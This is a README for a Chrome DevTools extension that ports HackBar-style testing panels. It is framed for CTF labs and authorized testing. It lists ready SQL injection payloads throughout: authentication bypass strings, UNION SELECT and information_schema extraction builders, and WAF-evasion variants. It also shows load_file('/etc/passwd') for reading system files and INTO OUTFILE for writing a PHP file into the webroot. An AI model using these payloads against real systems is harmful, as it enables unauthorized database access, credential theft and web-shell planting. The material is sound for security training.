# HackBar Mod Chrome Port

HackBar Mod Chrome Port is a Chrome DevTools extension inspired by classic HackBar-style testing panels.  
It provides a simple payload workspace inside Chrome DevTools with organized menus for SQL injection learning, URL encoding/decoding, WAF payload formatting, shell-related SQL payload helpers, and privilege enumeration helpers.

> This project is intended for legal security testing, CTF labs, training environments, and authorized penetration testing only.

---

## Features

### DevTools Panel

The extension adds a custom Chrome DevTools panel named:

```text
HackBar

Inside the panel, you get:

Payload editor
Execute button
Load URL button
Clear button
Organized payload menus above the editor
Main Menus
1. SQLi

The SQLi menu contains payloads and helpers for SQL injection testing and CTF practice.

Basic statements

Includes three nested categories:

comment

Payloads:

'
"
\
)
)?
‘)
boolean

Payloads:

+AND+1=1--
+AND+1=2--
+OR+1=1--
Auth bypass

Payloads:

133337' OR 1 = 1
' OR 1 = 1 --
' OR '1'='1' --
' OR '1' = '1
' OR 1 = 1 #
' OR 1=1 /*
' OR username LIKE '%' --
admin' or true
admin' --
2. Column Count

Helpers for discovering the number of columns in SQL injection points.

Includes:

ORDER BY custom...
GROUP BY

The custom option asks for the number of columns and builds the payload automatically.

3. Union Statement

Helpers for building UNION SELECT payloads.

Includes:

UNION SELECT custom...
UNION SELECT NULL custom...

The extension asks for the number of columns and generates a matching UNION SELECT payload.

4. Databases

Useful SQL functions and variables:

database()
user()
current_user()
version()
@@version
@@secure_file_priv
5. Tables

Dynamic payload builders for extracting table names from information_schema.tables.

Includes:

table_name
GROUP_CONCAT
database
split

The extension asks for:

Total number of columns
Vulnerable column position

Then it injects the selected SQL expression into the vulnerable column.

6. Columns

Dynamic payload builders for extracting column names from information_schema.columns.

Includes:

column_name
GROUP_CONCAT

The extension asks for:

Table name
Total number of columns
Vulnerable column position
7. Data

Dynamic payload builders for extracting data from a selected table.

Includes:

data
all database

The data option asks for:

Table name
Total number of columns
Vulnerable column position
Data/column name

Example generated structure:

+union+select+1,2,3,data_name,5,6+FROM+table_name+--+-

The all database option builds a payload using:

schema_name
FROM information_schema.schemata
URL Tools

The %URL menu includes encoding and decoding tools:

URL Encode
URL Decode
BASE64 Encode
BASE64 Decode
HEX Encode
HEX Decode

These tools work on the selected text inside the payload editor.
If no text is selected, they transform the full payload content.

WAF Menu

The WAF menu contains payload variations that may help in CTF or lab environments when testing how filters handle encoded or modified SQL syntax.

Categories include:

comment

Examples:

/**/OR/**/1=1+--+-
%20OR%201=1--%20-
%09OR%091=1--%09-
%0aOR%0a1=1--%0a-
order by

Examples:

OrDeR+By
/**/ORDER/**/BY/**/
union select

Examples:

UN/**/I/**/ON+SE/**/L/**/ECT
U<>N/**/I/**/O<>N+SE<>L/**/E/**/C<>T
%2f%2a%2a%2fUNION%2f%2a%2a%2fSELECT%2f%2a%2a%2f
Shell Menu

The Shell menu contains SQL payload helpers related to file operations in controlled labs.

load file

Payload:

load_file('/etc/passwd')
out file

Payload:

+INTO+OUTFILE+'/var/www/html/pescyte.php'
Privilege Menu

The Privilege menu contains helpers for checking SQL user and file privileges.

current user

Payload:

current_user()
privilege type

Dynamic payload builder.

When selected, the extension asks for:

Total number of columns
Vulnerable column position

It then builds a payload similar to:

+UNION+SELECT+1,2,GROUP_CONCAT(privilege_type),4,5,6 FROM information_schema.user_privileges--+-

The GROUP_CONCAT(privilege_type) value is inserted into the vulnerable column selected by the user.

privilege file

Payload:

@@secure_file_priv
Buttons
Execute

Loads the current payload editor value as the inspected page URL.

The value must start with:

http
Load URL

Loads the current inspected browser tab URL into the payload editor.

Clear

Clears the payload editor.

Installation
Download or clone this repository.
Open Chrome.
Go to:
chrome://extensions/
Enable:
Developer mode
Click:
Load unpacked
Select the extension folder.
Open DevTools.
Click the new panel:
HackBar
Project Structure
.
├── manifest.json
├── devtools.html
├── devtools.js
├── panel.html
├── panel.js
└── style.css
manifest.json

Chrome extension manifest file.

devtools.html

Loads the DevTools script.

devtools.js

Creates the custom DevTools panel.

panel.html

Contains the panel interface, menus, buttons, and payload textarea.

panel.js

Contains payload insertion logic, dynamic prompt builders, encoding/decoding tools, and DevTools execution behavior.

style.css

Controls the layout and visual style of the panel.

Usage Notes

This tool does not automatically test or exploit targets.
It only helps organize and insert common payloads into a DevTools-based workspace.

Use it only on:

Your own applications
CTF labs
Training platforms
Authorized bug bounty programs
Authorized penetration testing engagements
Disclaimer

This project is provided for educational and authorized security testing purposes only.
The developer is not responsible for any misuse or unauthorized activity performed with this tool.

Always get proper permission before testing any system.
